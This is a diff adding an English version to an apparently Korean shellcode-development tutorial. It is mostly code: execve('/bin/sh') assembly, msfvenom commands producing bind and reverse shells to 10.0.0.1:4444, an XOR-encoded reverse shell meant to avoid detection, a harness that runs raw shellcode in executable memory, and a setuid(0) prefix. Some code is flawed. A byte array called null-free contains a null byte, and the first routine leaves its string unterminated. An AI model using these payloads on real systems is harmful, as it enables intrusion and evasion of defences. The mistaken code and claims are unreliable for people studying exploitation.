@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 셸코드 개발
 
 ## 1. 셸코드란
@@ -791,3 +797,172 @@ shellcode = (
     # ... 이후 execve 셸코드 이어붙이기
 )
 ```
+
+---
+
+<a name="english"></a>
+
+# Shellcode Development
+
+## 1. What is Shellcode
+
+Shellcode is machine code designed to execute directly within a target process by exploiting a vulnerability. While the typical goal is to execute a shell (`/bin/sh`), in the broader sense it refers to any arbitrary payload code.
+
+---
+
+## 2. Linux x86-64 Shellcode Basics
+
+### execve("/bin/sh") Shellcode
+
+```nasm
+; Linux x86-64 execve("/bin/sh", NULL, NULL) shellcode
+BITS 64
+
+section .text
+global _start
+
+_start:
+    ; execve("/bin/sh", NULL, NULL)
+    ; syscall number 59 (0x3b)
+    
+    xor rdx, rdx          ; rdx = NULL (envp)
+    xor rsi, rsi          ; rsi = NULL (argv)
+    
+    ; Push "/bin/sh" string
+    mov rax, 0x68732f6e69622f2f  ; "//bin/sh"
+    push rax
+    mov rdi, rsp          ; rdi = pointer to "/bin/sh"
+    
+    push 59               ; syscall number for execve
+    pop rax
+    syscall               ; execute execve
+```
+
+```python
+# Test shellcode with pwntools
+from pwn import *
+
+shellcode = asm(shellcraft.amd64.linux.sh())
+print(f"Shellcode length: {len(shellcode)} bytes")
+print(f"Shellcode hex: {shellcode.hex()}")
+
+# Check for null bytes
+if b'\x00' in shellcode:
+    print("[!] WARNING: Shellcode contains null bytes")
+```
+
+---
+
+## 3. Null-Free Shellcode Techniques
+
+```nasm
+; Technique: XOR to avoid null bytes
+; Instead of:  mov rax, 0
+; Use:         xor rax, rax
+
+; Instead of mov rdi, 0x68732f6e69622f2f (may have nulls)
+; Build string on stack:
+
+; "/bin/sh" = 0x68732f6e69622f2f
+; No null bytes in this value, but verify:
+python3 -c "print(b'/bin/sh\x00'.hex())"
+; Result: 2f62696e2f736800  ← has 0x00!
+
+; Solution: Use "//bin/sh" (8 chars, no null)
+; 0x68732f6e69622f2f = "//bin/sh" reversed = no null
+```
+
+---
+
+## 4. Shellcode Encoders
+
+```bash
+# MSFvenom shellcode generation
+# Basic Linux x86-64 shell
+msfvenom -p linux/x64/exec CMD=/bin/sh \
+  -f python -b '\x00'
+
+# Bind shell (listen on port)
+msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 \
+  -f elf > bind_shell.elf
+
+# Reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=10.0.0.1 LPORT=4444 \
+  -f elf > reverse_shell.elf
+
+# Windows shellcode
+msfvenom -p windows/x64/shell_reverse_tcp \
+  LHOST=10.0.0.1 LPORT=4444 \
+  -f python -b '\x00\x0a\x0d'
+
+# Encode to avoid detection
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=10.0.0.1 LPORT=4444 \
+  -e x64/xor -i 5 \
+  -f elf > encoded_shell.elf
+```
+
+---
+
+## 5. Custom Shellcode Testing
+
+```python
+#!/usr/bin/env python3
+"""Shellcode testing harness"""
+import ctypes
+import mmap
+
+def execute_shellcode(shellcode: bytes) -> None:
+    """Execute shellcode in memory (Linux)"""
+    
+    # Allocate RWX memory
+    size = len(shellcode)
+    mem = mmap.mmap(-1, size, 
+                    prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
+                    flags=mmap.MAP_ANON | mmap.MAP_PRIVATE)
+    
+    # Write shellcode
+    mem.write(shellcode)
+    mem.seek(0)
+    
+    # Execute
+    ctypes.cast(ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mem))),
+                ctypes.CFUNCTYPE(None))()
+
+# Linux x86-64 execve("/bin/sh") shellcode (null-free)
+shellcode = bytes([
+    0x48, 0x31, 0xff,  # xor rdi, rdi
+    0x48, 0x31, 0xf6,  # xor rsi, rsi
+    0x48, 0x31, 0xd2,  # xor rdx, rdx
+    0x48, 0x31, 0xc0,  # xor rax, rax
+    0x50,              # push rax
+    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,  # movabs rbx, "/bin/"
+    0x73, 0x68, 0x00,  # "sh\x00"
+    0x53,              # push rbx
+    0x48, 0x89, 0xe7,  # mov rdi, rsp
+    0xb0, 0x3b,        # mov al, 0x3b (execve syscall)
+    0x0f, 0x05         # syscall
+])
+
+print(f"Shellcode ({len(shellcode)} bytes): {shellcode.hex()}")
+
+# Verify no null bytes
+if b'\x00' not in shellcode:
+    print("[+] No null bytes")
+else:
+    print("[!] Contains null bytes - may be truncated by strcpy!")
+```
+
+---
+
+## 6. setuid + execve Shellcode
+
+```python
+shellcode = (
+    b"\x48\x31\xff"            # xor rdi, rdi
+    b"\x6a\x69"                # push 0x69 (setuid syscall)
+    b"\x58"                    # pop rax
+    b"\x0f\x05"                # syscall (setuid(0))
+    # ... append execve shellcode after this
+)
